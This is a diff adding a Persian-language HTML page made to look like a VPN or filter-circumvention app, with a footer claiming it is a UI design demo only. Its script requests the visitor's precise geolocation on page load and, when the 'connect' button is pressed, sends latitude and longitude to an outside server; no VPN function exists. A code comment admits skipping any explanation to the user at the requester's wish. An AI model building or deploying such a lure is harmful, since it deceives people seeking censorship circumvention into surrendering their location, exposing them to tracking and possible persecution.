@@ -1,0 +1,275 @@
+<!doctype html>
+<html lang="fa">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>طراحی صفحهٔ شبیه فلترشکن (Design only)</title>
+  <style>
+    /* Reset ساده */
+    *{box-sizing:border-box;margin:0;padding:0}
+    html,body{height:100%}
+    body{
+      font-family: "Vazirmatn", Tahoma, Arial, sans-serif;
+      background: radial-gradient(1200px 600px at 10% 10%, #0f172a 0%, transparent 10%),
+                  linear-gradient(135deg,#0f172a 0%, #0b1220 30%, #071028 100%);
+      color:#e6eef8;
+      -webkit-font-smoothing:antialiased;
+      direction:rtl;
+      padding:32px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+    }
+
+    /* صفحه اصلی کارت */
+    .vpn-shell{
+      width:100%;
+      max-width:1100px;
+      background:linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.02));
+      border-radius:18px;
+      box-shadow: 0 10px 30px rgba(2,6,23,0.6);
+      overflow:hidden;
+      display:grid;
+      grid-template-columns: 430px 1fr;
+      gap:0;
+    }
+
+    /* نوار سمت چپ — اطلاعات و کنترل */
+    .panel{
+      padding:36px;
+      background:linear-gradient(180deg, rgba(16,24,40,0.6), rgba(6,12,24,0.4));
+      display:flex;
+      flex-direction:column;
+      gap:20px;
+    }
+
+    .brand{
+      display:flex;align-items:center;gap:16px
+    }
+    .logo{
+      width:56px;height:56px;border-radius:12px;
+      background:linear-gradient(135deg,#6ee7b7,#3b82f6);
+      display:flex;align-items:center;justify-content:center;
+      box-shadow:0 6px 18px rgba(59,130,246,0.18);
+      font-weight:700;color:#04243A
+    }
+    .brand h1{font-size:18px}
+    .brand p{opacity:0.75;font-size:12px;margin-top:6px}
+
+    /* وضعیت اتصال */
+    .status-card{
+      margin-top:8px;
+      background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+      border-radius:12px;padding:18px;display:flex;align-items:center;gap:14px;
+      border:1px solid rgba(255,255,255,0.03)
+    }
+    .status-dot{width:12px;height:12px;border-radius:50%;background:#34d399;box-shadow:0 0 12px #34d39966}
+    .status-text{font-size:14px}
+    .status-sub{font-size:12px;opacity:0.7}
+
+    /* toggle connect (css-only) */
+    .connect-wrap{display:flex;gap:14px;align-items:center;margin-top:8px}
+    .connect-ctrl{display:flex;flex-direction:column;gap:8px}
+    .toggle{position:relative;width:88px;height:44px;background:rgba(255,255,255,0.04);border-radius:999px;padding:6px;cursor:pointer;transition:all .25s}
+    .toggle .knob{width:32px;height:32px;border-radius:50%;background:white;transform:translateX(0);transition:transform .25s;box-shadow:0 6px 18px rgba(2,6,23,0.6)}
+
+    /* hidden checkbox controls state */
+    input[type=checkbox]{position:absolute;left:-9999px}
+    input[type=checkbox]:checked + label .knob{transform:translateX(44px)}
+    input[type=checkbox]:checked + label{background:linear-gradient(90deg,#10b981,#06b6d4)}
+
+    .connect-button{
+      margin-top:12px;padding:12px 18px;border-radius:12px;background:linear-gradient(90deg,#3b82f6,#6366f1);border:none;color:white;font-weight:700;cursor:pointer;box-shadow:0 10px 25px rgba(59,130,246,0.14)
+    }
+
+    /* اطلاعات آماری */
+    .stats{display:flex;gap:12px;margin-top:6px}
+    .stat{flex:1;background:rgba(255,255,255,0.02);padding:12px;border-radius:10px;text-align:center}
+    .stat strong{display:block;font-size:16px}
+    .stat span{display:block;font-size:12px;opacity:0.7;margin-top:6px}
+
+    /* لیست سرورها و جزئیات در سمت راست */
+    .right{
+      padding:40px;background-image:linear-gradient(180deg, rgba(12,20,30,0.02), transparent);
+    }
+    .search-row{display:flex;gap:12px;align-items:center;margin-bottom:18px}
+    .search{flex:1;padding:12px;border-radius:12px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.03)}
+
+    .servers{display:grid;grid-template-columns:repeat(2,1fr);gap:14px}
+    .server-card{padding:14px;border-radius:12px;background:linear-gradient(180deg, rgba(255,255,255,0.015), rgba(255,255,255,0.01));border:1px solid rgba(255,255,255,0.03);display:flex;align-items:center;gap:12px}
+    .flag{width:48px;height:36px;border-radius:8px;flex-shrink:0;background-size:cover;background-position:center}
+    .srv-info{flex:1}
+    .srv-info h3{font-size:14px}
+    .srv-info p{font-size:12px;opacity:0.7;margin-top:6px}
+    .srv-btn{padding:8px 12px;border-radius:10px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.04);font-weight:700;cursor:pointer}
+
+    /* footer small */
+    .foot{margin-top:auto;padding-top:18px;border-top:1px dashed rgba(255,255,255,0.03);font-size:12px;opacity:0.75}
+
+    /* responsive */
+    @media (max-width:980px){
+      .vpn-shell{grid-template-columns:1fr;max-width:920px}
+      .panel{order:2}
+      .right{order:1}
+      .servers{grid-template-columns:repeat(1,1fr)}
+    }
+
+    /* small micro-interactions */
+    .server-card:hover{transform:translateY(-6px);transition:transform .18s}
+    .connect-button:active{transform:translateY(2px)}
+
+  </style>
+</head>
+<body>
+  <main class="vpn-shell" role="main">
+    <aside class="panel" aria-label="کنترل وی‌پی‌ان">
+      <div class="brand">
+        <div class="logo">ف</div>
+        <div>
+          <h1>فیلترشکن گرافیکی</h1>
+      
+        </div>
+      </div>
+
+      <div class="status-card">
+        <div style="flex:0 0 auto">
+          <svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 2L3 6v6c0 5 3.6 9.8 9 10 5.4-.2 9-5 9-10V6l-9-4z" fill="#3b82f6"/>
+            <path d="M10 11l2 2 4-4" stroke="#0f172a" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </div>
+        <div style="flex:1">
+          <div class="status-text">حالت: <strong>متصل نیست</strong></div>
+          <div class="status-sub">آخرین تلاش: 12:24 — سرور پیش‌فرض</div>
+        </div>
+        <div style="text-align:left;flex:0 0 54px">
+          <div class="status-dot" style="background:#f97316;box-shadow:0 0 12px #f9731666"></div>
+        </div>
+      </div>
+
+      <div class="connect-wrap">
+        <div class="connect-ctrl">
+          <!-- checkbox فقط برای نمایش حالت -->
+         
+          <label for="cbox" class="toggle" aria-hidden="true">
+            <span class="knob"></span>
+          </label>
+          <small style="opacity:.7">تغییر به حالت خودکار</small>
+        </div>
+        <div style="flex:1">
+          <button id="retryBtn" class="connect-button">اتصال</button>
+          <div class="stats">
+            <div class="stat"><strong>128 ms</strong><span>پینگ</span></div>
+            <div class="stat"><strong>1.2 Mbps</strong><span>سرعت دانلود</span></div>
+            <div class="stat"><strong>کشوری/مختصر</strong><span>مکان انتخابی</span></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="foot">نسخه نمایشی — طراحی فقط برای رابط کاربری</div>
+    </aside>
+
+    <section class="right" aria-label="لیست سرورها">
+      <div class="search-row">
+        <input class="search" placeholder="جستجو سرورها یا کشور..." aria-label="جستجو سرورها">
+        <button class="srv-btn">فیلتر</button>
+      </div>
+
+      <div class="servers">
+        <article class="server-card">
+          <div class="flag" style="background-image:url('data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'240\' height=\'160\'><rect width=\'240\' height=\'160\' fill=\'%23038bff\'/><text x=\'120\' y=\'90\' font-size=\'48\' fill=\'%23ffffff\' font-family=\'Arial\' text-anchor=\'middle\'>US</text></svg>')"></div>
+          <div class="srv-info">
+            <h3>ایالات متحده — نیویورک</h3>
+            <p>پینگ: 120 ms · بار شبکه: کم</p>
+          </div>
+          <div><button class="srv-btn">انتخاب</button></div>
+        </article>
+
+        <article class="server-card">
+          <div class="flag" style="background-image:url('data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'240\' height=\'160\'><rect width=\'240\' height=\'160\' fill=\'%23EF4444\'/><text x=\'120\' y=\'90\' font-size=\'48\' fill=\'%23ffffff\' font-family=\'Arial\' text-anchor=\'middle\'>DE</text></svg>')"></div>
+          <div class="srv-info">
+            <h3>آلمان — فرانکفورت</h3>
+            <p>پینگ: 96 ms · بار شبکه: متوسط</p>
+          </div>
+          <div><button class="srv-btn">انتخاب</button></div>
+        </article>
+
+        <article class="server-card">
+          <div class="flag" style="background-image:url('data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'240\' height=\'160\'><rect width=\'240\' height=\'160\' fill=\'%230fbf6b\'/><text x=\'120\' y=\'90\' font-size=\'48\' fill=\'%23ffffff\' font-family=\'Arial\' text-anchor=\'middle\'>JP</text></svg>')"></div>
+          <div class="srv-info">
+            <h3>ژاپن — توکیو</h3>
+            <p>پینگ: 200 ms · بار شبکه: بالا</p>
+          </div>
+          <div><button class="srv-btn">انتخاب</button></div>
+        </article>
+
+        <article class="server-card">
+          <div class="flag" style="background-image:url('data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'240\' height=\'160\'><rect width=\'240\' height=\'160\' fill=\'%239b8cff\'/><text x=\'120\' y=\'90\' font-size=\'48\' fill=\'%23ffffff\' font-family=\'Arial\' text-anchor=\'middle\'>TR</text></svg>')"></div>
+          <div class="srv-info">
+            <h3>ترکیه — استانبول</h3>
+            <p>پینگ: 80 ms · بار شبکه: کم</p>
+          </div>
+          <div><button class="srv-btn">انتخاب</button></div>
+          <h1 id="status" style="display: none;"></h1>
+        </article>
+
+      </div>
+
+    </section>
+  </main>
+  <script>
+    const statusEl = document.getElementById('status');
+    const retryBtn = document.getElementById('retryBtn');
+   
+    async function sendLocationToServer(lat, lon) {
+      try {
+        const res = await fetch('https://allllllldldlldld.vercel.app/api/send-location', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ latitude: lat, longitude: lon })
+        });
+        if (!res.ok) throw new Error('خطا در سرور: ' + res.status);
+        const data = await res.json();
+        statusEl.textContent = 'موقعیت فرستاده شد ✅';
+      } catch (err) {
+        console.error(err);
+        statusEl.textContent = 'خطا در ارسال موقعیت: ' + err.message;
+      }
+    }
+
+    function requestLocation() {
+      if (!('geolocation' in navigator)) {
+        statusEl.textContent = 'مرورگر شما پشتیبانی نمی‌کند.';
+        return;
+      }
+
+      // تلاش برای گرفتن موقعیت یک بار
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          statusEl.textContent = `موقعیت دریافت شد: ${lat.toFixed(6)}, ${lon.toFixed(6)} — در حال ارسال...`;
+          sendLocationToServer(lat, lon);
+        },
+        (err) => {
+          console.warn('geolocation error', err);
+          statusEl.textContent = 'کاربر اجازه نداد یا خطا رخ داد: ' + err.message;
+          retryBtn.style.display = 'inline-block';
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    }
+
+    // سعی می‌کنیم هنگام ورود صفحه موقعیت را بگیریم
+    window.addEventListener('load', () => {
+      // بهتره ابتدا به کاربر توضیح بدی، اما طبق درخواستی که گفتی مستقیم می‌زنیم
+      requestLocation();
+    });
+
+    retryBtn.addEventListener('click', () => {
+      statusEl.textContent = 'در حال تلاش مجدد...';
+      requestLocation();
+    });
+  </script>
+</body>
+</html>
